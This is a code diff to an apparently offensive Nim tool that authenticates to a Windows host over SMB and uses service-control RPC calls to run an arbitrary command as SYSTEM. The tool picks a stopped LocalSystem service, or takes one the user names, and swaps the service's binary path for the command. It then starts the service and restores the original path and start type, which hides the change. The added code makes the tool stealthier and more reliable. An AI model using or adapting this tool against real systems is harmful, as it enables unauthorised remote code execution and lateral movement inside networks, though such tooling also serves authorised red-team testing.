@@ -8,11 +8,14 @@ import Structs
 import Packets
 
 
-proc SelectRandomService(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int, scManagerHandle: ptr array[20,byte], serviceList: ptr seq[ServiceInfo],smbSigning:bool, hmacSha256Key: ptr byte):string =
+
+proc SelectRandomService(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int, scManagerHandle: ptr array[20,byte], serviceList: ptr seq[ServiceInfo], selectedServiceInfo: ptr ServiceInfo,smbSigning:bool, hmacSha256Key: ptr byte):string =
     var lengthOfServiceList = serviceList[].len
     var scServiceHandle:array[20,byte]
     var returnValue: string
-    #var testService:ServiceInfo
+    #discard OpenServiceWRPC(socket, messageID, treeID, sessionID, fileID, callID, scManagerHandle,"sense",addr scServiceHandle,smbSigning,hmacSha256Key)
+    #messageID[] = messageID[]+1
+    #callID[] = callID[]+1
     #discard OpenServiceWRPC(socket, messageID, treeID, sessionID, fileID, callID, scManagerHandle,"TieringEngineService",addr scServiceHandle,smbSigning,hmacSha256Key)
     #discard QueryServiceConfigWRPC(socket, messageID, treeID, sessionID, fileID, callID,addr scServiceHandle, addr testService,smbSigning,hmacSha256Key)
     #discard CloseServiceHandleRPC(socket, messageID, treeID, sessionID, fileID, callID, addr scServiceHandle,smbSigning, hmacSha256Key)
@@ -21,29 +24,29 @@ proc SelectRandomService(socket: net.Socket, messageID:ptr uint64, treeID: ptr a
     for i in countup(0,lengthOfServiceList-1): # You can increase try limit
         if(serviceList[][i].ServiceState == SERVICE_STOPPED):
             if(not OpenServiceWRPC(socket, messageID, treeID, sessionID, fileID, callID, scManagerHandle,serviceList[][i].ServiceName,addr scServiceHandle,smbSigning,hmacSha256Key)):
+                messageID[] = messageID[]+1
+                callID[] = callID[]+1
                 continue
             if(not QueryServiceConfigWRPC(socket, messageID, treeID, sessionID, fileID, callID,addr scServiceHandle, addr serviceList[][i],smbSigning,hmacSha256Key)):
+                messageID[] = messageID[]+1
+                callID[] = callID[]+1
                 continue
-            echo serviceList[][i].Dependencies
-            echo serviceList[][i].ServiceStartName
-            if((serviceList[][i].StartType == SERVICE_DEMAND_START or serviceList[][i].StartType == SERVICE_DISABLED) and serviceList[][i].Dependencies.len == 0 and toLower(serviceList[][i].ServiceStartName) == "localsystem"):
-                echo "[+] Found service name is ", serviceList[][i].ServiceName
+            if((serviceList[][i].StartType == SERVICE_DEMAND_START or serviceList[][i].StartType == SERVICE_DISABLED) and serviceList[][i].Dependencies == "/" and toLower(serviceList[][i].ServiceStartName) == "localsystem"):
                 returnValue = serviceList[][i].ServiceName
-                discard CloseServiceHandleRPC(socket, messageID, treeID, sessionID, fileID, callID, addr scServiceHandle,smbSigning, hmacSha256Key)
+                selectedServiceInfo[] = serviceList[][i]
+                if(not CloseServiceHandleRPC(socket, messageID, treeID, sessionID, fileID, callID, addr scServiceHandle,smbSigning, hmacSha256Key)):
+                    messageID[] = messageID[]+1
+                    callID[] = callID[]+1
                 return returnValue
             if(not CloseServiceHandleRPC(socket, messageID, treeID, sessionID, fileID, callID, addr scServiceHandle,smbSigning, hmacSha256Key)):
+                messageID[] = messageID[]+1
+                callID[] = callID[]+1
                 continue
             
     return ""
         
-
-when isMainModule:
-    PrintBanner()
-    var optionsStruct:OPTIONS
-    if(not ParseArgs(paramCount(),commandLineParams(),addr optionsStruct)):
-        PrintHelp() 
-        quit(0)
-    var serviceList:seq[ServiceInfo] = newSeq[ServiceInfo](0)
+      
+proc StartNimExec():void = 
     var serviceName: string
     var messageID:uint64 = 0
     var treeID:array[4,byte]
@@ -53,6 +56,19 @@ when isMainModule:
     var scServiceHandle:array[20,byte]
     var smbSigning:bool = false
     var callID:int = 0
+    var optionsStruct:OPTIONS 
+    var tcpSocket:net.Socket = newSocket(buffered=false)
+    var smbNegotiateFlags:seq[byte] = newSeq[byte](4)
+    var smbSessionKeyLength:seq[byte] = newSeq[byte](2)
+    var hmacSha256Key:array[16,byte]
+    var newCommand:string 
+    var serviceList:seq[ServiceInfo]
+    var selectedServiceInfo:ServiceInfo
+    PrintBanner()
+    if(not ParseArgs(paramCount(),commandLineParams(),addr optionsStruct)):
+        PrintHelp() 
+        quit(0)
+    
     if(optionsStruct.Domain != ""):
         optionsStruct.OutputUsername = optionsStruct.Domain & "\\" & optionsStruct.Username
     else:
@@ -61,10 +77,6 @@ when isMainModule:
     # var test = targetBytesInWCharForm.len
     # var test2:array[4,byte]
     # copyMem(addr test2[0],addr targetBytesInWCharForm[0],6)
-    var tcpSocket:net.Socket = newSocket(buffered=false)
-    var smbNegotiateFlags:seq[byte] = newSeq[byte](4)
-    var smbSessionKeyLength:seq[byte] = newSeq[byte](2)
-    var hmacSha256Key:array[16,byte]
     try:
         tcpSocket.connect(optionsStruct.Target,Port(445),60000)
     except CatchableError:
@@ -107,22 +119,37 @@ when isMainModule:
         quit(0)
     if(optionsStruct.IsVerbose):
         echo "[+] SCManager handle is obtained!"
-    if(not EnumServicesStatusWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle, addr serviceList,smbSigning,addr hmacSha256Key[0])):
-        echo "[!] Problem in EnumServicesStatusW RPC!"
-        quit(0)
-    randomize()
-    serviceName = SelectRandomService(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle, addr serviceList,smbSigning,addr hmacSha256Key[0])
-    if(serviceName == ""):
-        echo "[!] Cannot find a suitable service!"
-        quit(0)
+    newCommand = optionsStruct.Command
+    if(optionsStruct.Service != ""):
+        serviceName = optionsStruct.Service
+    else:
+        if(not EnumServicesStatusWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle,addr serviceList, smbSigning,addr hmacSha256Key[0])):
+            echo "[!] Problem in EnumServicesStatusW RPC!"
+            quit(0)
+        randomize()
+        serviceName = SelectRandomService(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle, addr serviceList, addr selectedServiceInfo, smbSigning,addr hmacSha256Key[0])
+        if(serviceName == ""):
+            echo "[!] Cannot find a suitable service!"
+            quit(0)
     
-    if(not OpenServiceWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle,"test31",addr scServiceHandle,smbSigning,addr hmacSha256Key[0])):
-        echo "[!] Problem in OpenServiceW RPC!"
-        quit(0)
+    echo "[+] Selected service is ", serviceName
+    
+    if(not OpenServiceWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scManagerHandle,serviceName,addr scServiceHandle,smbSigning,addr hmacSha256Key[0])):
+            echo "[!] Problem in OpenServiceW RPC!"
+            quit(0)
     if(optionsStruct.IsVerbose):
         echo "[+] Service: ",serviceName ," is opened!"
+
+    if(optionsStruct.Service != ""):
+        if(not QueryServiceConfigWRPC(tcpSocket,addr messageID,addr treeID,addr sessionID,addr fileID,addr callID,addr scServiceHandle, addr selectedServiceInfo,smbSigning,addr hmacSha256Key[0])):
+            echo "[!] Problem in QueryServiceConfigW RPC!"
+            quit(0)
     
-    if(not ChangeServiceConfigWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle, optionsStruct.Command,smbSigning,addr hmacSha256Key[0])):
+    var previousServicePath:string = selectedServiceInfo.BinaryPath
+    if(optionsStruct.IsVerbose):
+        echo "[+] Previous Service Path is: ",previousServicePath
+
+    if(not ChangeServiceConfigWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle, cast[uint32](SERVICE_DEMAND_START), newCommand,smbSigning,addr hmacSha256Key[0])):
         echo "[!] Problem in ChangeServiceConfigW RPC!"
         quit(0)
     if(optionsStruct.IsVerbose):
@@ -132,6 +159,11 @@ when isMainModule:
         quit(0)
     if(optionsStruct.IsVerbose):
         echo "[+] Service start request is sent!"
+    if(not ChangeServiceConfigWRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle, cast[uint32](selectedServiceInfo.StartType), previousServicePath,smbSigning,addr hmacSha256Key[0])):
+        echo "[!] Problem in ChangeServiceConfigW RPC!"
+        quit(0)
+    if(optionsStruct.IsVerbose):
+        echo "[+] Service config is restored!"
     if(not CloseServiceHandleRPC(tcpSocket, addr messageID, addr treeID, addr sessionID, addr fileID, addr callID, addr scServiceHandle,smbSigning,addr hmacSha256Key[0])):
         echo "[!] Problem in CloseServiceHandle RPC!"
         quit(0)
@@ -157,3 +189,6 @@ when isMainModule:
         quit(0)
     if(optionsStruct.IsVerbose):
         echo "[+] Session logoff!"  
+
+when isMainModule:
+    StartNimExec()
